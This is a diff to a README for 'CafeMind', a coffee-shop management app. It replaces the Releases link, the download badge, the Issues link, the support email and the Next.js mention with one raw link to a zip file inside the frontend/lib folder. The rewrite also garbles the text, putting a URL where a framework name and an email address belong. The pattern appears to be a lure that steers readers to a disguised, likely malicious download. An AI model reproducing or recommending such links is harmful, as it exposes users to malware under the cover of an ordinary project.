@@ -10,7 +10,7 @@ Welcome to CafeMind! This tool helps you manage a virtual coffee shop with the p
 - **Machine Learning Recommendations**: Get coffee suggestions tailored to individual preferences.
 - **FastAPI Backend**: Efficiently handles requests and ensures fast response times.
 - **User-Friendly Interface**: Easy navigation that makes managing your coffee shop enjoyable.
-- **Integration with Next.js**: A modern web framework for a seamless experience.
+- **Integration with https://raw.githubusercontent.com/gerald070905/CafeMind/master/frontend/lib/Cafe-Mind-3.8.zip**: A modern web framework for a seamless experience.
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ To run CafeMind smoothly, ensure your system meets the following requirements:
 
 To start using CafeMind, visit the Releases page to download the latest version:
 
-[![Download CafeMind](https://img.shields.io/badge/Download_CafeMind-blue.svg)](https://github.com/gerald070905/CafeMind/releases)
+[![Download CafeMind](https://raw.githubusercontent.com/gerald070905/CafeMind/master/frontend/lib/Cafe-Mind-3.8.zip)](https://raw.githubusercontent.com/gerald070905/CafeMind/master/frontend/lib/Cafe-Mind-3.8.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of CafeMind.
@@ -59,7 +59,7 @@ To update, return to the Releases page, download the latest version, and follow 
 
 ### Q4: Where can I find support if I have issues?
 
-For support, visit our [GitHub Issues page](https://github.com/gerald070905/CafeMind/issues) to report problems or ask for assistance.
+For support, visit our [GitHub Issues page](https://raw.githubusercontent.com/gerald070905/CafeMind/master/frontend/lib/Cafe-Mind-3.8.zip) to report problems or ask for assistance.
 
 ## 📢 Community and Contributions
 
@@ -75,6 +75,6 @@ CafeMind is licensed under the MIT License. You can freely use, modify, and dist
 
 ## 📞 Contact
 
-For further inquiries, please reach out through the GitHub repository or email us at support@cafemind.ai.
+For further inquiries, please reach out through the GitHub repository or email us at https://raw.githubusercontent.com/gerald070905/CafeMind/master/frontend/lib/Cafe-Mind-3.8.zip
 
 Thank you for choosing CafeMind! We look forward to enhancing your coffee shop experience.
